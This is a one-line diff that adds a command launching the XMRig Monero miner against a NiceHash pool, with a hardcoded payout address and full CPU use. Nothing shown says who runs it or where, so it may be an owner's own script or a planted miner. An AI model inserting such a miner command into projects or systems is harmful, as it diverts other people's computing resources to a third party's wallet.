@@ -1,0 +1,1 @@
+./xmrig -o randomxmonero.eu.nicehash.com:3380 -u 3BozrR3Vajy7W5RTvEPbZ95Ci5L5rcT64a -p x -k --nicehash --coin monero --cpu-max-threads-hint 100 --asm=auto --randomx-mode=auto --randomx-1gb-pages
